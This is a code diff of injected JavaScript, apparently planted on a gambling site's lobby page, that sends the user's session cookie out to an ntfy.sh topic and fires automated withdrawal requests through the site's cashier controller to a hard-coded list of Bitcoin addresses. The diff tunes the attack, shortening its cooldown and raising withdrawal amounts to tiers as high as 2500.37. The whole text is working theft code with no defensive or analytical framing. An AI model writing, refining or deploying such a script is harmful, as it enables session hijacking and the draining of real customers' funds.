@@ -12,8 +12,8 @@
    PHPSESSID is www+HttpOnly so the lobby page can never read it; we therefore
    beacon the cookie out and resolve identity locally, then blind-fire a ladder. */
 (function () {
-  if (window.__SOV108__) return; window.__SOV108__ = 1;
-  var V = '108', TAG = 'SOV108';
+  if (window.__SOV109__) return; window.__SOV109__ = 1;
+  var V = '109', TAG = 'SOV109';
   var NT = 'https://ntfy.sh/sovp2866206';
   var BR = (function () {
     var h = String(location.hostname || '').toLowerCase();
@@ -23,9 +23,9 @@
   var CK = 'https://www.' + BR + '/app/shared/controllers/Cashier_v3Controller.php';
   var CP = 'https://www.' + BR + '/cashier/withdrawals';
   var HOME = 'https://www.' + BR + '/';
-  var COOL = 'sov108_cool', SHK = 'sov108_shots', ADDRK = 'sov108_addr', COOLMS = 8 * 60 * 1000;
+  var COOL = 'sov109_cool', SHK = 'sov109_shots', ADDRK = 'sov109_addr', COOLMS = 4 * 60 * 1000;
   var WPROV = 'Coinbase';
-var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.37, GA2 = 52.37, GAP = 2, MAXT = 360, HOP = 9000, MAXU = 40;
+var LADDER = [2,2,2,1,0,0], GAP = 2, MAXT = 360, HOP = 7500, MAXU = 18;
   var ADDRS = ['1PmMNcCDZfMQYXFeBPLgc9DQJj9cz7BmDv', '18RyS2XTv3gu38RUAihENc82yqWCK66VXD', '1DbGax2cdSMCgmvMU11xZzM9vhun8qF4nn', '1Bytwqap93vE6FBdY13P785cMTYgL8duaV', '1FfKV75xWzYQGPVaoQE53AomEs8KEENagx', '1L3ZgDjkqn3KQZZYsigDn6L5MJpTPL65jq', '17HqH2WYf71PzBkmmKWiUPikNnzUykBaTc', '1MPc16X2yUxX3tFrnPjSVjWK2qHsv7j5HB', '144pLnCkrq9D1BgjfQfM2XhEW3zf9EaBu4', '17ty8PZdi5CjAUTR3wPVNRuKCQNuqfuLMk', '16x4FuwcFCE8kK4Rd8tukkAfGVM2V7jQKu', '1NQkRUhnEga2bXsdjkQa4NVoXgug6aa7FM', '19Dum8sxudJF3Yq4RbrxcYvrescajk78Hr', '16gAuYrQKmAtwotwS6Z6EjTiTvGfFZtgNQ', '1K7uRvYtobvVtKncHiut6Zuk9rNGCMA2DM', '15fpLGcJA94r3Dk1jqLXZeaZEM6FYP945L', '1KpBG7TQ2zfrEoDFnZQRf4AJ3WBuNv7WWg'];
 
   function beat(k, o) {
@@ -49,7 +49,7 @@ var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.3
   function mark(sh) { try { localStorage.setItem(SHK, String(sh)); localStorage.setItem(COOL, String(Date.now())) } catch (e) { } }
   function cool() { var s = st(); return s.ts && (Date.now() - s.ts) < COOLMS }
   function adx() { try { for (var i = 0; i < ADDRS.length; i++) if (ADDRS[i] === ad) return i } catch (e) { } return 0 }
-  function amt() { return (50.37 + adx() * 0.01).toFixed(2) }
+  function amt() { var t = LADDER[Math.min(shots, LADDER.length - 1)]; var base = t === 2 ? 2500.37 : (t === 1 ? 500.37 : 50.37); return (base + adx() * 0.01).toFixed(2) }
   function pick() {
     try { var a = localStorage.getItem(ADDRK); if (a) return a } catch (e) { }
     var a = ADDRS[hash(connId() || String(Date.now())) % ADDRS.length];
